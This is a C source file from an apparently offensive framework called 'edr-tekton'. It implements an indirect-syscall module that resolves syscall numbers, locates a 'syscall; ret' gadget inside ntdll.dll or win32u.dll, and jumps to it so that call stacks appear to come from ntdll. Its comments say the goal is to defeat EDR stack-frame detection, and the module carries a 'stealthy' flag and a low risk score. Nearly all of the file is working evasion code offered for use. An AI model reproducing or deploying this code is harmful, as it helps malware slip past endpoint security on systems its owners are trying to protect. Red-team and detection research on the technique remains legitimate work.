/*
 * edr-tekton :: Indirect Syscall Module
 * Cat 2.4: Execute `syscall` from within ntdll's own code page
 *
 * Resolves a `syscall; ret` gadget in ntdll.dll (or win32u.dll)
 * .text section, then JMPs to it instead of executing syscall inline.
 *
 * Result: return address in the call stack points back to ntdll,
 * not our module. Defeats stack-frame analysis that flags non-ntdll
 * syscall origins.
 *
 * Can use win32u.dll as alternative gadget source (Cat 2.12)
 * since EDRs primarily monitor ntdll for syscall gadgets.
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _INDIRECT_SYSCALL_STATE {
    BOOL                initialized;
    TEKTON_SSN_METHOD   ssn_method;
    PVOID               ntdll_base;
    PVOID               syscall_gadget;     /* `syscall; ret` address in ntdll */
    PVOID               win32u_gadget;      /* Alternative from win32u.dll */
    BOOL                use_win32u;
} INDIRECT_SYSCALL_STATE;

/* Forward declarations */
extern TEKTON_STATUS TektonSsnResolve(PVOID, TEKTON_SSN_METHOD, PTEKTON_RESOLVED_STATE);
extern TEKTON_STATUS TektonSyscallFindGadgets(PVOID, PTEKTON_RESOLVED_STATE, BOOL);

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS indirect_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    INDIRECT_SYSCALL_STATE* state = (INDIRECT_SYSCALL_STATE*)malloc(sizeof(INDIRECT_SYSCALL_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));
    state->ssn_method = TEKTON_SSN_HALOS_GATE;
    state->use_win32u = FALSE; /* Enable via config for Cat 2.12 */

    self->private_data = state;

    TLOG_DEBUG("indirect_syscall: init");
    return TEKTON_OK;
}

static TEKTON_STATUS indirect_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    INDIRECT_SYSCALL_STATE* state = (INDIRECT_SYSCALL_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("indirect_syscall: [DRY RUN] would resolve SSNs + find syscall gadget");
        return TEKTON_OK;
    }

    /* Step 1: Find ntdll base */
    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) {
        TLOG_ERROR("indirect_syscall: ntdll.dll not found");
        return TEKTON_ERR_API_RESOLVE;
    }
    state->ntdll_base = ntdll_base;

    /* Step 2: Resolve SSNs */
    TEKTON_STATUS status = TektonSsnResolve(
        ntdll_base, state->ssn_method, &ctx->resolved
    );
    if (status != TEKTON_OK) {
        TLOG_ERROR("indirect_syscall: SSN resolution failed");
        return status;
    }

    /* Step 3: Find `syscall; ret` gadget in .text section */
    status = TektonSyscallFindGadgets(ntdll_base, &ctx->resolved, state->use_win32u);
    if (status != TEKTON_OK) {
        TLOG_ERROR("indirect_syscall: no syscall gadget found");
        return status;
    }

    state->syscall_gadget = ctx->resolved.syscall_gadget;
    state->win32u_gadget  = ctx->resolved.syscall_gadget_alt;

    state->initialized = TRUE;

    TLOG_INFO("indirect_syscall: ready, gadget=%p%s",
        state->syscall_gadget,
        state->win32u_gadget ? " (win32u alt available)" : "");

    return TEKTON_OK;
}

static VOID indirect_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(INDIRECT_SYSCALL_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD indirect_risk_score(PTEKTON_MODULE self) {
    (void)self;
    return 15; /* Low: return address points to ntdll, looks legitimate */
}

static BOOL indirect_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    return ctx->os.is_x64; /* x64 only: syscall instruction */
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_indirect_syscall = {
    .name           = "indirect_syscall",
    .description    = "Indirect syscalls via ntdll/win32u gadget JMP (Cat 2.4/2.12)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_REQUIRES_X64 | TEKTON_MOD_STEALTHY,
    .skill_ref      = "2.4",
    .init           = indirect_init,
    .execute        = indirect_execute,
    .cleanup        = indirect_cleanup,
    .get_risk_score = indirect_risk_score,
    .check_compat   = indirect_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_indirect_syscall);
